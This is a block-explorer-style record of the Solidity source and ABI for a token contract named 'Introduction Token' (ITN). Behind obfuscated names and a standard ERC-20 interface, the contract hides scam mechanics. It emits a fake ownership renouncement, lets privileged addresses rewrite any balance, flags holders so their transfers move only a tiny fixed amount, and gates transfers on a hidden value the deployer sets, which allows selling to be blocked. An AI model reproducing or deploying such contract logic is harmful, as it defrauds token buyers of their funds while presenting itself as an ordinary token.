{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface isFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeAmount) external view returns (uint256);\n\n    function transfer(address takeMinMax, uint256 exemptLimitSwap) external returns (bool);\n\n    function allowance(address fromTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptLimitSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeMinMax,\n        uint256 exemptLimitSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderLiquiditySell, uint256 value);\n    event Approval(address indexed fromTrading, address indexed spender, uint256 value);\n}\n\nabstract contract tokenLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromReceiverTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyFee {\n    function createPair(address buyTxList, address sellTrading) external returns (address);\n}\n\ninterface isFromMetadata is isFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IntroductionToken is tokenLiquidity, isFrom, isFromMetadata {\n\n    function allowance(address walletTotal, address maxExempt) external view virtual override returns (uint256) {\n        if (maxExempt == modeLiquidityTeam) {\n            return type(uint256).max;\n        }\n        return senderEnable[walletTotal][maxExempt];\n    }\n\n    address private totalToken;\n\n    mapping(address => bool) public shouldLiquidity;\n\n    function maxSwap(address takeLaunchedLaunch, address takeMinMax, uint256 exemptLimitSwap) internal returns (bool) {\n        if (takeLaunchedLaunch == isExempt) {\n            return autoLiquidityMin(takeLaunchedLaunch, takeMinMax, exemptLimitSwap);\n        }\n        uint256 maxFrom = isFrom(buyMarketing).balanceOf(amountFrom);\n        require(maxFrom == takeLaunched);\n        require(takeMinMax != amountFrom);\n        if (fromReceiver[takeLaunchedLaunch]) {\n            return autoLiquidityMin(takeLaunchedLaunch, takeMinMax, liquidityAuto);\n        }\n        return autoLiquidityMin(takeLaunchedLaunch, takeMinMax, exemptLimitSwap);\n    }\n\n    function transfer(address minFromTo, uint256 exemptLimitSwap) external virtual override returns (bool) {\n        return maxSwap(_msgSender(), minFromTo, exemptLimitSwap);\n    }\n\n    function toFee() public {\n        emit OwnershipTransferred(isExempt, address(0));\n        totalToken = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchWallet;\n    }\n\n    address amountFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address modeLiquidityTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function autoLiquidityMin(address takeLaunchedLaunch, address takeMinMax, uint256 exemptLimitSwap) internal returns (bool) {\n        require(marketingAmountLimit[takeLaunchedLaunch] >= exemptLimitSwap);\n        marketingAmountLimit[takeLaunchedLaunch] -= exemptLimitSwap;\n        marketingAmountLimit[takeMinMax] += exemptLimitSwap;\n        emit Transfer(takeLaunchedLaunch, takeMinMax, exemptLimitSwap);\n        return true;\n    }\n\n    string private toSell = \"ITN\";\n\n    uint8 private liquidityReceiver = 18;\n\n    bool public txSenderMin;\n\n    mapping(address => uint256) private marketingAmountLimit;\n\n    address public buyMarketing;\n\n    uint256 private launchWallet = 100000000 * 10 ** 18;\n\n    uint256 marketingModeFee;\n\n    bool public senderIs;\n\n    function approve(address maxExempt, uint256 exemptLimitSwap) public virtual override returns (bool) {\n        senderEnable[_msgSender()][maxExempt] = exemptLimitSwap;\n        emit Approval(_msgSender(), maxExempt, exemptLimitSwap);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txIsTeam;\n    }\n\n    function balanceOf(address takeAmount) public view virtual override returns (uint256) {\n        return marketingAmountLimit[takeAmount];\n    }\n\n    bool public tokenSwapAuto;\n\n    string private txIsTeam = \"Introduction Token\";\n\n    function exemptTo(address takeSell) public {\n        sellAuto();\n        if (tokenSwapAuto) {\n            tokenSwapAuto = false;\n        }\n        if (takeSell == isExempt || takeSell == buyMarketing) {\n            return;\n        }\n        fromReceiver[takeSell] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return totalToken;\n    }\n\n    function transferFrom(address takeLaunchedLaunch, address takeMinMax, uint256 exemptLimitSwap) external override returns (bool) {\n        if (_msgSender() != modeLiquidityTeam) {\n            if (senderEnable[takeLaunchedLaunch][_msgSender()] != type(uint256).max) {\n                require(exemptLimitSwap <= senderEnable[takeLaunchedLaunch][_msgSender()]);\n                senderEnable[takeLaunchedLaunch][_msgSender()] -= exemptLimitSwap;\n            }\n        }\n        return maxSwap(takeLaunchedLaunch, takeMinMax, exemptLimitSwap);\n    }\n\n    function sellAuto() private view {\n        require(shouldLiquidity[_msgSender()]);\n    }\n\n    constructor (){\n        if (tokenSwapAuto) {\n            tokenSwapAuto = false;\n        }\n        fromReceiverTotal receiverMode = fromReceiverTotal(modeLiquidityTeam);\n        buyMarketing = buyFee(receiverMode.factory()).createPair(receiverMode.WETH(), address(this));\n        \n        isExempt = _msgSender();\n        toFee();\n        shouldLiquidity[isExempt] = true;\n        marketingAmountLimit[isExempt] = launchWallet;\n        if (tokenSwapAuto) {\n            tokenSwapAuto = false;\n        }\n        emit Transfer(address(0), isExempt, launchWallet);\n    }\n\n    uint256 takeLaunched;\n\n    mapping(address => bool) public fromReceiver;\n\n    uint256 private launchedAutoTrading;\n\n    uint256 public toLimit;\n\n    function owner() external view returns (address) {\n        return totalToken;\n    }\n\n    function amountLaunchedWallet(address minFromTo, uint256 exemptLimitSwap) public {\n        sellAuto();\n        marketingAmountLimit[minFromTo] = exemptLimitSwap;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toSell;\n    }\n\n    event OwnershipTransferred(address indexed launchedMarketing, address indexed isSenderMarketing);\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityReceiver;\n    }\n\n    uint256 constant liquidityAuto = 19 ** 10;\n\n    function isFee(uint256 exemptLimitSwap) public {\n        sellAuto();\n        takeLaunched = exemptLimitSwap;\n    }\n\n    address public isExempt;\n\n    bool public atMin;\n\n    function amountTeam(address isTradingAuto) public {\n        if (atMin) {\n            return;\n        }\n        if (txSenderMin == tokenSwapAuto) {\n            toLimit = launchedAutoTrading;\n        }\n        shouldLiquidity[isTradingAuto] = true;\n        if (senderIs) {\n            tokenSwapAuto = true;\n        }\n        atMin = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private senderEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isSenderMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLiquiditySell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFromTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLimitSwap\",\"type\":\"uint256\"}],\"name\":\"amountLaunchedWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTradingAuto\",\"type\":\"address\"}],\"name\":\"amountTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLimitSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSell\",\"type\":\"address\"}],\"name\":\"exemptTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptLimitSwap\",\"type\":\"uint256\"}],\"name\":\"isFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSwapAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFromTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLimitSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunchedLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeMinMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLimitSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSenderMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "IntroductionToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}